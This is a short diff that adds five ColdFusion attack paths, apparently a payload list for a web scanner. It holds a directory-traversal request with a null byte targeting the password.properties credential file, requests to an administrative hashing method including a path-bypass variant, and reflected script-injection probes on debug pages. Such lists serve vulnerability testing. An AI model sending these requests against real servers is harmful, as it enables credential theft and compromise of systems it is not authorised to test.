@@ -1,0 +1,5 @@
+/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
+//CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx
+/hax/..CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx
+/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
+/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
